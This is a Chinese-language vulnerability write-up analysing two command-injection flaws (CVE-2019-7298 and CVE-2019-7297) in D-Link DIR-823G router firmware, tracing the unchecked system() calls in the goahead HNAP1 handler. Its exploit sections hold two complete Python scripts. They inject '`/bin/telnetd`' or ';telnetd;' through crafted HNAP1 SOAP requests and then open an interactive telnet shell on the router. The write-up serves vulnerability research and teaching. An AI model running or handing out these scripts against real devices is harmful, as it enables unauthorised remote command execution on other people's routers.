<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="89456dc18f56b288667d380e7641ecff">CVE-2019-7298</h2>
<h3 data-content="1" id="378b0cdf18f27521a1f09c0065075173">漏洞原理</h3>
<p>D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。在HNAP API函数处理请求之前，system函数执行了不可信的命令，触发该漏洞。</p>
<h3 data-content="1" id="dc1bfa813b9cd4af3ecd8420c5ad895d">漏洞分析</h3>
<p>在每次内核启动之后将启动init进程，init进程的启动时根据/etc/inittab这个文件赖在不同运行级别启动相应的进程或执行相应的操作。其中sysinit代表系统的初始化，只有系统开机或重新启动的时候，后面对应的process才会执行一次。</p>
<pre><code>::sysinit:/etc/init.d/rcS</code></pre>
<p>在rcS中，先执行一些列mkdir和设置，执行了<code>goahead</code>。</p>
<blockquote>
<p><code>goahead</code> 是一个开源的 <code>web</code> 服务器，用户的定制性非常强。可以通过一些 <code>goahead</code> 的 <code>api</code>定义 <code>url</code>处理函数和可供 <code>asp</code> 文件中调用的函数，具体可以看看官方的代码示例和网上的一些教程。</p>
</blockquote>
<p>goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数：</p>
<div class="highlight"><pre><span></span><span class="n">websUrlHandlerDefine</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="s">"/HNAP1"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">websHNAPHandler</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">websUrlHandlerDefine</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="s">"/goform"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">websFormHandler</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">websUrlHandlerDefine</span><span class="p">(</span><span class="n">T</span><span class="p">(</span><span class="s">"/cgi-bin"</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">websCgiHandler</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></div>
<p>以上代表/HNAP1的请求交给websHNAPHandler函数处理，/gofrom的请求交给websFormHandler函数处理，/cgi-bin的请求交websCgiHandler函数处理。这些处理函数有统一的参数：</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="n">webs_t</span> <span class="n">wp</span><span class="p">,</span> <span class="n">char_t</span> <span class="o">*</span><span class="n">url</span><span class="p">,</span> <span class="n">char_t</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">char_t</span> <span class="o">*</span><span class="n">query</span><span class="p">)</span>
<span class="n">wp</span>    <span class="n">Web</span> <span class="n">server</span> <span class="n">connection</span> <span class="n">handle</span><span class="p">.</span>  
<span class="n">url</span>   <span class="n">Request</span> <span class="n">URL</span><span class="p">.</span>  
<span class="n">path</span>  <span class="n">Request</span> <span class="n">path</span> <span class="n">portion</span> <span class="n">of</span> <span class="n">the</span> <span class="n">URL</span><span class="p">.</span>  
<span class="n">query</span> <span class="n">Query</span> <span class="n">string</span> <span class="n">portion</span> <span class="n">of</span> <span class="n">the</span> <span class="n">URL</span><span class="p">.</span>
</pre></div>
<p>先了解/HNAP1请求的处理函数，在goahead中查找“HNAP1”字符串并通过xref定位处理函数sub_42383c</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190717105434-34f70688-a83e-1.png"/></p>
<p><code>sub_4238c</code>主要通过遍历全局的函数表来处理HNAP1接受的不同请求。function_list中每个元素的前四个字节为函数名，后四个字节为对应的函数地址。当找到在function_list中找到函数名与请求相同的字符串时，向/var/hnaplog中记录<code>param_7</code>的值，这个值但从汇编不太能看出，<a href="https://xz.aliyun.com/t/2834#toc-4" target="_blank">hackedbylh</a>指出是post的报文，在运行过程中查看/var/hnaplog能猜出来。之后调用对应的函数地址处理相关请求。</p>
<p>这里无论处理请求的函数名是什么，在找到之后会通过snprintf输入字符且未做检查，之后直接system执行，存在命令注入漏洞。如果post请求是'`/bin/telnetd`'，就会先开启telnet服务器，再讲字符写入hnaplog。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190717105445-3b77a4fe-a83e-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190717105535-59c4da4e-a83e-1.png"/><br/>
另外需要注意，post的数据要加上引号，因为echo '%s' &gt; /var/hnaplog中本身带了单引号，如果只是`/bin/telnet`，相当于</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">'`/bin/telnet`'</span> &gt; /var/hnaplog
</pre></div>
<p>由于命令由引号括起，会当做字符串处理，不会执行命令</p>
<p>而</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s1">''</span><span class="sb">`</span>/bin/telnet<span class="sb">`</span><span class="s1">''</span> &gt; /var/hnaplog
</pre></div>
<p>post中的两个引号分别与自带的两个引号组合，反引号没有嵌套在单引号中，会当做命令执行。</p>
<h3 data-content="1" id="3def4d14895db3b4c8e5ec27a2ef27a7">漏洞利用</h3>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">IP</span><span class="o">=</span><span class="s1">'192.168.0.1'</span>
<span class="n">command</span> <span class="o">=</span><span class="s2">"'`/bin/telnetd`'"</span>
<span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

<span class="n">headers</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">default_headers</span><span class="p">()</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Length"</span><span class="p">]</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"SOAPAction"</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'"http://purenetworks.com/HNAP1/Login"'</span><span class="c1">#此处的Login可以替换为任何在function_list中的函数名</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text/xml; charset=UTF-8"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept"</span><span class="p">]</span><span class="o">=</span><span class="s2">"*/*"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept-Encoding"</span><span class="p">]</span><span class="o">=</span><span class="s2">"gzip, deflate"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept-Language"</span><span class="p">]</span><span class="o">=</span><span class="s2">"zh-CN,zh;q=0.9,en;q=0.8"</span>


<span class="n">payload</span> <span class="o">=</span> <span class="n">command</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span><span class="mi">23</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="648b077e969a3461ad7f17ee745ea597">CVE-2019-7297漏洞原理</h2>
<h3 data-content="1" id="8988da980f8c2fd591970023797e729b">漏洞原理</h3>
<p>D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。GetNetworkTomographyResult函数中调用system函数，执行的内容中包括不受信任的用户输入Address字段，攻击者可以远程执行任意命令。</p>
<h3 data-content="1" id="20e91c28a7444d0881e9958c94bc27e6">漏洞分析</h3>
<p>漏洞原理中提到的GetNetworkTomographyResult函数是在goahead二进制文件中实现的。在function_list中找到对应的函数地址。</p>
<p>GetNetworkTomographyResult获取address，number，size参数，作为ping的参数。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190717105553-64267b8c-a83e-1.png"/></p>
<div class="highlight"><pre><span></span>ping address -c number -w number -s size &gt; /tmp/ping.txt <span class="m">2</span>&gt;&gt;/tmp/ping.txt
</pre></div>
<p>但在system之前并没有对这些外来参数进行检查，如果address为<code>;telnetd;</code>就能启动Telnet服务。可以看出这些参数都是通过apmib_get获取的，那么在之前一定有apmib_set进行设置，在IDA中查找关键字0x1b72，0x1b73，0x1b73，定位到apmib_set的位置，结合ghidra的反汇编代码，确定在<code>SetNetworkTomographySettings</code>函数中可以对这些参数进行设置。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190717105612-6f4c1f12-a83e-1.png"/></p>
<h3 data-content="1" id="2c88fa63b1e9f736356eb14136a8b668">漏洞利用</h3>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">IP</span><span class="o">=</span><span class="s1">'192.168.0.1'</span>

<span class="n">headers</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">default_headers</span><span class="p">()</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"SOAPAction"</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'"http://purenetworks.com/HNAP1/SetNetworkTomographySettings"'</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"text/xml; charset=UTF-8"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept"</span><span class="p">]</span><span class="o">=</span><span class="s2">"*/*"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept-Encoding"</span><span class="p">]</span><span class="o">=</span><span class="s2">"gzip, deflate"</span>
<span class="n">headers</span><span class="p">[</span><span class="s2">"Accept-Language"</span><span class="p">]</span><span class="o">=</span><span class="s2">"zh-CN,zh;q=0.9,en;q=0.8"</span>


<span class="n">payload</span> <span class="o">=</span> <span class="s1">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><span class="se">\</span>
<span class="s1">  &lt;soap:Body&gt;</span><span class="se">\</span>
<span class="s1">    &lt;SetNetworkTomographySettings xmlns="http://purenetworks.com/HNAP1/"&gt;</span><span class="se">\</span>
<span class="s1">      &lt;Address&gt;;telnetd;&lt;/Address&gt;</span><span class="se">\</span>
<span class="s1">      &lt;Number&gt;4&lt;Number&gt;</span><span class="se">\</span>
<span class="s1">          &lt;Size&gt;4&lt;/Size&gt;</span><span class="se">\</span>
<span class="s1">     &lt;/SetNetworkTomographySettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="n">headers</span><span class="p">[</span><span class="s2">"SOAPAction"</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'"http://purenetworks.com/HNAP1/GetNetworkTomographyResult"'</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><span class="se">\</span>
<span class="s1">  &lt;soap:Body&gt;</span><span class="se">\</span>
<span class="s1">    &lt;GetNetworkTomographyResult xmlns="http://purenetworks.com/HNAP1/"&gt;</span><span class="se">\</span>
<span class="s1">     &lt;/GetNetworkTomographyResult&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">'http://'</span><span class="o">+</span><span class="n">IP</span><span class="o">+</span><span class="s1">'/HNAP1/'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span><span class="mi">23</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h2 data-content="1" id="00a3857f1fd8e3d35752805dba2b9b8f">参考链接</h2>
<p>【1】<a href="https://github.com/leonW7/D-Link/blob/master/Vul_1.md" target="_blank">https://github.com/leonW7/D-Link/blob/master/Vul_1.md</a></p>
<p>【2】<a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank">https://github.com/leonW7/D-Link/blob/master/Vul_2.md</a></p>
<p>【3】Dlink DIR-823G 漏洞挖掘过程 - 先知社区  <a href="https://xz.aliyun.com/t/2834#toc-4" target="_blank">https://xz.aliyun.com/t/2834#toc-4</a></p>
<p>【4】<a href="http://2.235.186.56/docs/techref/wsapi/websUrlHandlerDefine.htm" target="_blank">http://2.235.186.56/docs/techref/wsapi/websUrlHandlerDefine.htm</a></p>
</div>
</div>